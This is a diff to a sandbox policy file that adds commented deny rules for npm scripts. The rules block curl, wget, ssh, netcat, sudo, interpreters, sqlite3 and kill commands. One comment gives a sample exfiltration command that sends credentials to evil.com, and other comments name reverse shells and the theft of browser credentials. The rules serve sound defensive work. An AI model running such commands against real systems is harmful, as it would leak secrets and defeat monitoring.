@@ -26,15 +26,31 @@ commands:
     - bash
     - git
   deny:
+    # HTTP clients — npm should use its own registry client, not shell out to curl
     - curl
     - wget
+    # Remote access — no legitimate reason for npm scripts to open SSH sessions
     - ssh
+    # Raw networking — can open arbitrary TCP/UDP connections, reverse shells
     - nc
     - ncat
+    # Privilege escalation — npm scripts should never need root
     - "*sudo*"
+    # Interpreters — prevent proxy execution attacks via other runtimes
     - "python*"
     - perl
     - ruby
+    # Scripting interpreters — arbitrary code execution bypassing traced process
+    - osascript    # AppleScript/JXA: shell, file, network via scripting bridge
+    - swift
+    - java
+    # Data exfiltration
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat creds)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, etc.)
+    # Anti-tracing — can terminate the malwi agent/CLI
+    - kill
+    - pkill
+    - killall
 
 network:
   allow:
